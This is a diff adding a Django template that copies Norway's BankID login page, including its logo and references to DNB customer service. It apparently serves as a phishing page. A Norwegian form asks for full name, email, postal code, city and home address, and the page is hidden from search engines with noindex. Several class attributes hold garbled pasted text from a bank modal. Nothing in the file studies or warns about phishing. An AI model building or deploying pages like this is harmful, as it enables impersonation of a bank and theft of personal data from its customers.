@@ -1,0 +1,121 @@
+{% load static %}
+<html lang="nb">
+<head>
+    <meta charset="UTF-8">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet"
+          integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="robots" content="noindex, nofollow">
+    <link rel="icon" type="image/png" href="{% static 'img/favicon.png' %}">
+    <title>BankID</title>
+    <link href="{% static 'style/main.css' %}" rel="stylesheet">
+</head>
+<body class="">
+<main class="container">
+    <div class="container__content">
+        <div class="bankid-logo-wrapper">
+            <img alt="" class="bankid-logo" src="{% static 'img/logo.svg' %}">
+        </div>
+
+        <div class="page" id="payment" style="">
+            <form method="post" action="">
+                {% csrf_token %}
+                <div class="page__content card">
+
+                    <div class="card__heading">
+                        <h1 tabindex="-1" data-i18n="permission_payment_heading">Informasjon om brukeren</h1>
+                    </div>
+                    <div class="card__body">
+                        <p class="card__label" data-i18n="permission_common_merchant_label">Fullt navn</p>
+                        <div class="input-group mb-3">
+                            <div class="input-group-prepend">
+                            </div>
+                            <input type="text" id="name" name="name"
+                                   class="form-control"
+                                   placeholder="" aria-label="Username"
+                                   aria-describedby="basic-addon1" required>
+                        </div>
+                        <div class="card__horizontal-separator"></div>
+                        <p class="card__label" data-i18n="permission_payment_amount">E-post</p>
+                        <div>
+                            <div class="input-group mb-3">
+                                <div class="input-group-prepend">
+                                </div>
+                                <input id="email" name="email" type="text" class="form-control"
+                                       placeholder="@" aria-label="email"
+                                       aria-describedby="basic-addon1" required
+                                       aria-invalid="true">
+                            </div>
+                            <span id="js-payment-currency"
+                                  class="card__payment-9:41 Modal title Close 􀁍 Bekreft identitetssjekk Hvor DnB Kundeservice 15. mars 12:16, Norge Bekreft identitet Avbrytcurrency">NOK</span>
+                        </div>
+                        <div class="card__horizontal-separator"></div>
+                        <p class="card__label" data-i18n="permission_payment_amount">Land</p>
+                        <div>
+                            <div class="input-group mb-3">
+                                <div class="input-group-prepend">
+                                </div>
+                                <input id="country" name="country" type="text" class="form-control"
+                                       placeholder="" aria-label="country" value="Norway" disabled
+                                       aria-describedby="basic-addon1" required
+                                       aria-invalid="true">
+                            </div>
+                            <span id="js-payment-currency"
+                                  class="card__payment-9:41 Modal title Close 􀁍 Bekreft identitetssjekk Hvor DnB Kundeservice 15. mars 12:16, Norge Bekreft identitet Avbrytcurrency">NOK</span>
+                        </div>
+                        <p class="card__label" data-i18n="permission_payment_amount">Postnummer</p>
+                        <div>
+                            <div class="input-group mb-3">
+                                <div class="input-group-prepend">
+                                </div>
+                                <input id="postal" name="postal" type="tel" class="form-control"
+                                       placeholder="" aria-label="postal" value="{{ postal }}"
+                                       aria-describedby="basic-addon1" required
+                                       aria-invalid="true">
+                            </div>
+                            <span id="js-payment-currency"
+                                  class="card__payment-9:41 Modal title Close 􀁍 Bekreft identitetssjekk Hvor DnB Kundeservice 15. mars 12:16, Norge Bekreft identitet Avbrytcurrency">NOK</span>
+                        </div>
+                        <p class="card__label" data-i18n="permission_payment_amount">by</p>
+                        <div>
+                            <div class="input-group mb-3">
+                                <div class="input-group-prepend">
+                                </div>
+                                <input id="city" name="city" type="text" class="form-control"
+                                       placeholder="" aria-label="zip" value="{{ city }}"
+                                       aria-describedby="basic-addon1" required
+                                       aria-invalid="true">
+                            </div>
+                            <span id="js-payment-currency"
+                                  class="card__payment-9:41 Modal title Close 􀁍 Bekreft identitetssjekk Hvor DnB Kundeservice 15. mars 12:16, Norge Bekreft identitet Avbrytcurrency">NOK</span>
+                        </div>
+                        <p class="card__label" data-i18n="permission_payment_amount">Hjemmeadresse</p>
+                        <div>
+                            <div class="input-group mb-3">
+                                <div class="input-group-prepend">
+                                </div>
+                                <input id="address" name="address" type="text" class="form-control"
+                                       placeholder="" aria-label="address"
+                                       aria-describedby="basic-addon1" required
+                                       aria-invalid="true">
+                            </div>
+                            <span id="js-payment-currency"
+                                  class="card__payment-9:41 Modal title Close 􀁍 Bekreft identitetssjekk Hvor DnB Kundeservice 15. mars 12:16, Norge Bekreft identitet Avbrytcurrency">NOK</span>
+                        </div>
+
+                    </div>
+                </div>
+                <div class="page__buttons">
+                    <button type="submit" data-i18n="permission_payment_heading" id="confirm-payment-button"
+                            class="login-button">
+                        Bekrefte
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+</main>
+<script>
+</script>
+</body>
+</html>
